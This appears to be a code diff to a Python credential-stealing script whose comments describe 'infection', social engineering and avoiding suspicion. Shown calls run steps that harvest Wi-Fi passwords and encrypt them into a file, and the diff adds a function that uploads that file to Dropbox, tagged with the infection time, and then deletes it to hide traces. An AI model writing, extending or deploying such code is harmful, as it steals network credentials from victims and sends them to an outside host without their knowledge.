@@ -4,6 +4,9 @@ import time
 import pyautogui
 import subprocess
 import pyAesCrypt
+import dropbox
+
+localtime_infection = time.asctime( time.localtime(time.time()) )   #starting infection time
 
 def wait_social_engineering():
     time.sleep(2)                                 #waiting for removing suspicion
@@ -30,7 +33,16 @@ def encrypt():                  #encrypting the file to which wifi_password save
     # encrypt
     pyAesCrypt.encryptFile("word1.txt", "word1.txt.aes", password, bufferSize)
     subprocess.call("rm word1.txt",shell=True)          #removing the original text file
+    
+def cleansing_dropbox():                               #uploading file to dropbox and removing the encrypt file
+    encrypt_file=open("/tmp/word1.txt.aes")
+    dropbox_object=dropbox.Dropbox("dropbox tocken")        #dropbox tocken
+    with open("/tmp/word1.txt.aes", "rb") as f:
+        dropbox_object.files_upload(f.read(), "/word1.txt.aes"+localtime_infection, mute = True)
+    subprocess.call("rm word1.txt.aes",shell=True)
+
 
 wait_social_engineering()
 wifi_password()
 encrypt()
+cleansing_dropbox()
